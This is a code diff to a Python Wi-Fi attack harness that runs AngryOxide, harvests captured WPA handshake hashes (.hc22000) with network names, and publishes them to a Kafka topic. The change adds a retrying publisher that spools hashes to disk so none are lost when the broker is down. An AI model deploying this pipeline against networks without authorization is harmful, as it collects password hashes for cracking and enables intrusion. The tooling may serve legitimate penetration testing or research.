@@ -8,6 +8,7 @@ import os
 import json
 import shutil
 import argparse
+from collections import deque
 from kafka import KafkaProducer
 
 # ======================
@@ -18,6 +19,12 @@ sysId = 'Attack1'
 MODULE_INTERVAL = 5  # Interval in seconds to run attack modules
 KAFKA_BROKER = 'localhost:9092'  # Default Kafka broker
 WHITELIST_FILE = 'whitelist.txt'  # Passed to AngryOxide with --whitelist
+
+# Kafka resilience settings
+KAFKA_TOPIC = 'wifi-hash'                # Topic hashes are published to
+KAFKA_SPOOL_FILE = 'kafka_spool.jsonl'   # On-disk backlog of un-sent messages
+KAFKA_CONNECT_TIMEOUT_MS = 5000          # Max time to block establishing/using the producer
+KAFKA_SEND_TIMEOUT = 10                  # Seconds to wait for each message's broker ack
 
 # AngryOxide band IDs (from nl80211): 2 = 2.4 GHz, 5 = 5 GHz, 6 = 6 GHz, 60 = 60 GHz.
 # Passing --band <id> tells AngryOxide to scan every channel the interface is
@@ -251,19 +258,164 @@ def parse_hash_filename(hc_file):
         return parts[0], parts[1]
     return name_without_ext, 'unknown'
 
-def publish_to_kafka(topic, message, broker='localhost:9092'):
-    """Publish a message to a Kafka topic and print to terminal."""
-    try:
-        producer = KafkaProducer(
-            bootstrap_servers=[broker],
-            value_serializer=lambda v: json.dumps(v).encode('utf-8')
-        )
-        producer.send(topic, value=message)
-        producer.flush()
-        print(f"[+] Published to Kafka topic '{topic}': {message}")
-        producer.close()
-    except Exception as e:
-        print(f"[!] Error publishing to Kafka: {e}")
+class KafkaPublisher:
+    """Resilient Kafka publisher with an on-disk backlog.
+
+    Every message is queued (and mirrored to a spool file) the moment it is
+    generated, then the whole backlog is flushed to the broker oldest-first.
+    Delivery is synchronous: a message only leaves the queue once the broker
+    acknowledges it (send().get()). If the broker is unreachable the messages
+    simply stay queued; each later flush() retries, so once the broker returns
+    everything is delivered in order and the tool logs that the connection was
+    restored. Because the backlog is spooled to disk, queued messages also
+    survive a restart of the tool.
+    """
+
+    def __init__(self, broker, topic=KAFKA_TOPIC, spool_path=KAFKA_SPOOL_FILE,
+                 connect_timeout_ms=KAFKA_CONNECT_TIMEOUT_MS, send_timeout=KAFKA_SEND_TIMEOUT):
+        self.broker = broker
+        self.topic = topic
+        self.spool_path = spool_path
+        self.connect_timeout_ms = connect_timeout_ms
+        self.send_timeout = send_timeout
+        self.queue = deque()
+        self.producer = None
+        self.connected = None  # None = not yet attempted; True/False once known
+        self._reload_spool()
+
+    # --- spool persistence -------------------------------------------------
+
+    def _reload_spool(self):
+        """Load messages left undelivered by a previous run."""
+        if not os.path.isfile(self.spool_path):
+            return
+        try:
+            with open(self.spool_path, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line:
+                        self.queue.append(json.loads(line))
+            if self.queue:
+                print(f"[*] Loaded {len(self.queue)} un-sent Kafka message(s) from '{self.spool_path}'")
+        except Exception as e:
+            print(f"[!] Could not read Kafka spool '{self.spool_path}': {e}")
+
+    def _append_spool(self, message):
+        """Append one message to the spool as soon as it is queued (write-ahead)."""
+        try:
+            with open(self.spool_path, 'a') as f:
+                f.write(json.dumps(message) + '\n')
+        except Exception as e:
+            print(f"[!] Could not append to Kafka spool '{self.spool_path}': {e}")
+
+    def _rewrite_spool(self):
+        """Persist the current queue after it shrinks; remove the file when empty."""
+        try:
+            if not self.queue:
+                if os.path.isfile(self.spool_path):
+                    os.remove(self.spool_path)
+                return
+            tmp = self.spool_path + '.tmp'
+            with open(tmp, 'w') as f:
+                for message in self.queue:
+                    f.write(json.dumps(message) + '\n')
+            os.replace(tmp, self.spool_path)
+        except Exception as e:
+            print(f"[!] Could not update Kafka spool '{self.spool_path}': {e}")
+
+    # --- producer lifecycle ------------------------------------------------
+
+    def _ensure_producer(self):
+        """Return True if a producer is available. Creating it also probes the
+        broker, so a failure here means the broker is currently unreachable."""
+        if self.producer is not None:
+            return True
+        try:
+            self.producer = KafkaProducer(
+                bootstrap_servers=[self.broker],
+                value_serializer=lambda v: json.dumps(v).encode('utf-8'),
+                acks='all',
+                retries=2,
+                max_block_ms=self.connect_timeout_ms,
+            )
+            return True
+        except Exception:
+            self.producer = None
+            return False
+
+    def _teardown_producer(self):
+        if self.producer is not None:
+            try:
+                self.producer.close(timeout=1)
+            except Exception:
+                pass
+            self.producer = None
+
+    def _mark_down(self, error=None):
+        """Record that the broker is unreachable; announce only on transition."""
+        if self.connected is not False:
+            reason = f" ({error})" if error else ""
+            print(f"[!] Kafka broker {self.broker} unreachable{reason} — "
+                  f"queuing messages ({len(self.queue)} pending in '{self.spool_path}')")
+        self.connected = False
+
+    # --- public API --------------------------------------------------------
+
+    def publish(self, message):
+        """Queue a message (persisting it) and try to flush the backlog."""
+        self.queue.append(message)
+        self._append_spool(message)
+        was_down = self.connected is False
+        self.flush()
+        if self.connected is False and was_down:
+            print(f"[*] Broker still down — message queued ({len(self.queue)} pending)")
+
+    def flush(self):
+        """Deliver every queued message oldest-first, stopping at the first
+        failure. Returns the count delivered on this call."""
+        if not self.queue:
+            return 0
+        if not self._ensure_producer():
+            self._mark_down()
+            return 0
+
+        was_down = self.connected is False
+        delivered = 0
+        while self.queue:
+            message = self.queue[0]  # peek; only pop once the broker confirms
+            try:
+                self.producer.send(self.topic, value=message).get(timeout=self.send_timeout)
+            except Exception as e:
+                # Broker went away mid-drain — keep this and the rest queued and
+                # rebuild the producer next time so restoration is detected cleanly.
+                self._teardown_producer()
+                if delivered:
+                    self._rewrite_spool()
+                self._mark_down(e)
+                return delivered
+            self.queue.popleft()
+            delivered += 1
+
+        self._rewrite_spool()  # queue now empty -> spool cleared
+        self.connected = True
+        if delivered:
+            if was_down:
+                print(f"[+] Kafka connection to {self.broker} restored — "
+                      f"delivered {delivered} queued message(s)")
+            else:
+                print(f"[+] Published {delivered} message(s) to Kafka topic '{self.topic}'")
+        return delivered
+
+    def pending(self):
+        return len(self.queue)
+
+    def close(self):
+        """Final flush and clean shutdown; anything undelivered stays spooled."""
+        self.flush()
+        self._teardown_producer()
+        if self.queue:
+            print(f"[!] {len(self.queue)} Kafka message(s) still queued in '{self.spool_path}' — "
+                  f"they will be sent on the next run once the broker is reachable")
 
 # ======================
 # Main Function
@@ -315,8 +467,13 @@ def main(interval, broker, use_local, use_kafka, auto_config):
     print(f"[*] Watching for .hc22000 files in '{os.path.abspath(hash_dir)}'")
     if use_local:
         print(f"[*] Output mode: Local files archived to '{archive_dir}' folder")
+
+    publisher = None
     if use_kafka:
-        print(f"[*] Kafka broker: {broker}")
+        print(f"[*] Kafka broker: {broker} (topic '{KAFKA_TOPIC}')")
+        publisher = KafkaPublisher(broker)
+        # Drain anything left over from a previous run before we start capturing.
+        publisher.flush()
     if use_local and use_kafka:
         print("[*] Hash files will be saved locally AND published to Kafka")
 
@@ -357,8 +514,8 @@ def main(interval, broker, use_local, use_kafka, auto_config):
                                 'hash': line
                             }
                             print(f"[+] Read hash from {essid} ({bssid}): {line}")
-                            if use_kafka:
-                                publish_to_kafka('wifi-hash', message, broker=broker)
+                            if publisher:
+                                publisher.publish(message)
 
                     # Archive locally so captures survive the next cleanup.sh run
                     if new_hashes and archive_dir:
@@ -367,11 +524,19 @@ def main(interval, broker, use_local, use_kafka, auto_config):
                 except Exception as e:
                     print(f"[!] Error reading {hc_file}: {e}")
 
+            # Retry any queued messages every pass. This is what notices the
+            # broker coming back and drains the backlog even when no new hashes
+            # were captured this cycle.
+            if publisher and publisher.pending():
+                publisher.flush()
+
         except KeyboardInterrupt:
             print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
             print("[*] Terminating subprocesses...")
             if angryoxide:
                 angryoxide.terminate()
+            if publisher:
+                publisher.close()
             break
         except Exception as e:
             print(f"[!] Exception occurred: {e}")
